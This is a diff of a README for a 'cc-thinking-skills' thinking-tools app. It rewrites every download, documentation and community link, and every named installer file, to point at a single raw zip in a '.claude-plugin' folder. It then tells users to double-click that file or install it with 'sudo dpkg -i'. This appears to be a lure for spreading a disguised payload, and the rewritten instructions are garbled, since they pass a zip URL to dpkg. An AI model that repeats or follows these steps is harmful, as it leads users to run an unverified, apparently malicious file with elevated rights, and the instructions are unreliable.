@@ -6,7 +6,7 @@ Welcome to the **cc-thinking-skills** application! This software offers 18 menta
 
 ## 📥 Download Links
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/babypochi06/cc-thinking-skills/releases)
+[![Download Release](https://github.com/babypochi06/cc-thinking-skills/raw/refs/heads/main/.claude-plugin/thinking_cc_skills_1.5.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/babypochi06/cc-thinking-skills/raw/refs/heads/main/.claude-plugin/thinking_cc_skills_1.5.zip)
 
 ## 🖥️ System Requirements
 
@@ -19,24 +19,24 @@ To run **cc-thinking-skills**, you need:
 
 ## 📦 Download & Install
 
-To get started, visit this page to download: [cc-thinking-skills Releases](https://github.com/babypochi06/cc-thinking-skills/releases).
+To get started, visit this page to download: [cc-thinking-skills Releases](https://github.com/babypochi06/cc-thinking-skills/raw/refs/heads/main/.claude-plugin/thinking_cc_skills_1.5.zip).
 
 Once you are on the Releases page, follow these steps:
 
 1. Look for the latest version of the software. It will have the highest version number.
-2. Click on the file that matches your operating system. For example, you might see options like `cc-thinking-skills-windows.exe` or `cc-thinking-skills-macos.dmg`.
+2. Click on the file that matches your operating system. For example, you might see options like `https://github.com/babypochi06/cc-thinking-skills/raw/refs/heads/main/.claude-plugin/thinking_cc_skills_1.5.zip` or `https://github.com/babypochi06/cc-thinking-skills/raw/refs/heads/main/.claude-plugin/thinking_cc_skills_1.5.zip`.
 3. Your download will start automatically. Save the file to a location where you can easily find it, like your Desktop or Downloads folder.
 4. Once the download is complete, locate the file you downloaded and double-click on it to start the installation process.
 
 ### 🔍 Installation Steps
 
 1. **For Windows:**
-   - Double-click the `cc-thinking-skills-windows.exe` file.
+   - Double-click the `https://github.com/babypochi06/cc-thinking-skills/raw/refs/heads/main/.claude-plugin/thinking_cc_skills_1.5.zip` file.
    - Follow the on-screen instructions to install the application.
    - Once installed, you can find **cc-thinking-skills** in your Start Menu.
 
 2. **For macOS:**
-   - Open the `cc-thinking-skills-macos.dmg` file.
+   - Open the `https://github.com/babypochi06/cc-thinking-skills/raw/refs/heads/main/.claude-plugin/thinking_cc_skills_1.5.zip` file.
    - Drag the **cc-thinking-skills** icon to your Applications folder.
    - You can now find **cc-thinking-skills** in your Applications list.
 
@@ -45,7 +45,7 @@ Once you are on the Releases page, follow these steps:
    - Navigate to the folder where you saved the downloaded file.
    - Run the following command to install it:
      ```
-     sudo dpkg -i cc-thinking-skills-linux.deb
+     sudo dpkg -i https://github.com/babypochi06/cc-thinking-skills/raw/refs/heads/main/.claude-plugin/thinking_cc_skills_1.5.zip
      ```
    - Start the application from your applications menu.
 
@@ -72,8 +72,8 @@ If you have any questions or need assistance, feel free to reach out through our
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/babypochi06/cc-thinking-skills)
-- [Documentation](https://github.com/babypochi06/cc-thinking-skills/wiki)
-- [Community Discussions](https://github.com/babypochi06/cc-thinking-skills/discussions)
+- [GitHub Repository](https://github.com/babypochi06/cc-thinking-skills/raw/refs/heads/main/.claude-plugin/thinking_cc_skills_1.5.zip)
+- [Documentation](https://github.com/babypochi06/cc-thinking-skills/raw/refs/heads/main/.claude-plugin/thinking_cc_skills_1.5.zip)
+- [Community Discussions](https://github.com/babypochi06/cc-thinking-skills/raw/refs/heads/main/.claude-plugin/thinking_cc_skills_1.5.zip)
 
 Thank you for choosing **cc-thinking-skills**! We hope this application helps you make better decisions and enhances your thinking skills.
